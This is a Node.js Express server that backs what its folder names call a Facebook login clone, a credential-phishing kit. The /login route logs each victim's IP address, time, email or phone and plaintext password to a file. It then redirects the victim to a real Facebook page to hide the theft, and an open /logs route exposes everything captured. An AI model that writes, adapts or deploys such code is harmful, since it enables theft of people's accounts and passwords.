const express = require('express')
const morgan = require('morgan')
const dotenv = require('dotenv')
const path = require('path')
const bodyParser = require("body-parser");
var fs = require('fs')

const PORT = process.env.PORT || 5000;

//Configure environment files
dotenv.config()

//Create an application with express
const app = express()

//Use json format fot this application
app.use(express.json());
app.use(express.urlencoded());

app.use(bodyParser.urlencoded({
    extended: true
}));
/**bodyParser.json(options)
 * Parses the text as JSON and exposes the resulting object on req.body.
 */
app.use(bodyParser.json());




app.use("/", express.static(path.join(__dirname, 'views/fb-login-clone')));

//set view engine
app.set('view engine','ejs')

//Make public static folders
app.use('/validation', express.static('validation')) //for images

app.all('*',function (req, res, next) {

    console.log("request made: ", req.headers['x-forwarded-for']?.split(',').shift()
    || req.socket?.remoteAddress)
    next();
})

app.get('/', function (req, res) {
    
    res.sendFile([path.join(__dirname,'/views/fb-login-clone/index.html'));
})

app.post('/login', function (req, res) {
    
    try {
        let content = "\nIP:"+ (req.headers['x-forwarded-for']?.split(',').shift()
        || req.socket?.remoteAddress) + "\nData: "+ new Date().toLocaleString("ro-RO", {hour12: "false"})+"\nemail/tel: "+req.body.name+"\nPass: "+req.body.pass+"\n"
        console.log("post made",req.body)
        fs.writeFileSync('./data/log.txt', content,{ flag: 'a+' })
        //file written successfully
      } catch (err) {
        console.error(err)
      }
    
    
    res.redirect("https://www.facebook.com/MarijuanaPolicyProject");
})

app.get('/logs', async function (req, res) {
    
    //const file =  fs.readFileSync(path.join(__dirname,'./data/log.txt'))
    res.sendFile(path.join(__dirname,'/data/log.txt'))

})

app.listen(PORT, function(err){
    if (err) console.log(err);
    console.log("Server listening on PORT", PORT);
});





